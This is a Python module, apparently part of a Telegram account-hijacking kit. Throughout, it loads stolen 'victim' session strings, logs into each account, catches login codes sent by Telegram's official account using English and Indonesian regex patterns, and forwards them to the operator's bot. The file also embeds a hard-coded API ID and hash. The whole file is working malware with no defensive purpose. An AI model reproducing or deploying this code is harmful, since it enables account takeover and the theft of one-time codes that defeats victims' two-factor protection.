import asyncio
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from database import get_all_victim_sessions, update_victim_otp
from bot_handler import send_otp_notification

logger = logging.getLogger(__name__)

API_ID = int(os.environ.get("API_ID", 24289127))
API_HASH = os.environ.get("API_HASH", "cd63113435f4997590ee4a308fbf1e2c")

# Global dictionary to store active clients
active_clients = {}

async def setup_otp_interceptor(phone, session_string):
    """Setup OTP interceptor for a victim"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        @client.on(events.NewMessage)
        async def message_handler(event):
            try:
                # Check if message is from Telegram official
                if event.message.sender_id == 777000:  # Telegram official ID
                    message_text = event.message.text
                    
                    # OTP pattern matching
                    patterns = [
                        r'is your login code:?\s*(\d{4,6})',
                        r'verification code:?\s*(\d{4,6})',
                        r'kode verifikasi:?\s*(\d{4,6})',
                        r'kode masuk:?\s*(\d{4,6})',
                        r'code:?\s*(\d{4,6})',
                        r'kode:?\s*(\d{4,6})',
                        r'(\d{4,6})\s*is your code',
                        r'kode Anda:?\s*(\d{4,6})',
                        r'kode:\s*(\d{4,6})',
                        r'code is\s*(\d{4,6})'
                    ]
                    
                    for pattern in patterns:
                        match = re.search(pattern, message_text, re.IGNORECASE)
                        if match:
                            otp_code = match.group(1)
                            logger.info(f"🚨 OTP Captured for {phone}: {otp_code}")
                            
                            # Send notification
                            await send_otp_notification(phone, otp_code, "Telegram Message")
                            break
                            
            except Exception as e:
                logger.error(f"Message handler error for {phone}: {e}")
        
        await client.start()
        active_clients[phone] = client
        logger.info(f"✅ OTP Interceptor active for {phone}")
        return client
        
    except Exception as e:
        logger.error(f"❌ Failed to setup interceptor for {phone}: {e}")
        return None

async def start_otp_interceptors():
    """Start OTP interceptors for all victims"""
    try:
        while True:
            victims = get_all_victim_sessions()
            logger.info(f"🎯 Starting OTP interceptors for {len(victims)} victims...")
            
            current_phones = set(active_clients.keys())
            new_phones = set(v[0] for v in victims)
            
            # Remove disconnected clients
            for phone in current_phones - new_phones:
                if phone in active_clients:
                    await active_clients[phone].disconnect()
                    del active_clients[phone]
                    logger.info(f"🔌 Disconnected interceptor for {phone}")
            
            # Add new clients
            for phone, session_string in victims:
                if phone not in active_clients:
                    await setup_otp_interceptor(phone, session_string)
            
            logger.info(f"😈 OTP Interceptors active: {len(active_clients)}")
            await asyncio.sleep(60)  # Check every minute
            
    except Exception as e:
        logger.error(f"OTP interceptors main error: {e}")
        await asyncio.sleep(30)
        await start_otp_interceptors()  # Restart
